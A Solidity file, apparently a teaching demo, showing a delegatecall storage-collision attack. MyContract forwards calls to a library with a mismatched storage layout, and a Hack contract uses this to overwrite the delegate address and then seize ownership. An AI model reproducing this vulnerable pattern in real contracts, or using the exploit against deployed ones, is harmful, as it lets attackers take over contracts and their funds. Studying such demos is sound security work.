// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Hack {
    address public s_otherContract;
    address public s_owner;

    MyContract public toHack;

    constructor(address _to) {
        toHack = MyContract(_to);
    }

    function attack() external {
        toHack.delegateGetData(uint256(uint160(address(this))));
        toHack.delegateGetData(0);
    }

    function getData(uint256 /*timestamp*/) external payable {
        s_owner = msg.sender;
    }
}

contract MyContract {
    address public s_otherContract;
    address public s_owner;
    uint256 public s_at;
    address public s_sender;
    uint256 public s_amount;

    constructor(address _otherContract) {
        s_otherContract = _otherContract;
        s_owner = msg.sender;
    }

    function delegateGetData(uint256 timestamp) external payable {
        // Forwards request and executes in this contract
        (bool success, ) = s_otherContract.delegatecall(
            abi.encodeWithSelector(AnotherContract.getData.selector, timestamp)
        );
        require(success, "Fail delegate");
    }
}

contract AnotherContract {
    uint256 public s_at;
    address public s_sender;
    uint256 public s_amount;

    event Received(address indexed sender, uint256 indexed value);

    function getData(uint256 timestamp) external payable {
        // Will actually rewrite the values of the contract that delegate the call to this one
        // But there is a dependency on storage slots. So this s_at actually corresponds to MyContract.s_otherContract
        s_sender = msg.sender;
        s_at = timestamp;
        s_amount = msg.value;
        emit Received(msg.sender, msg.value);
    }
}
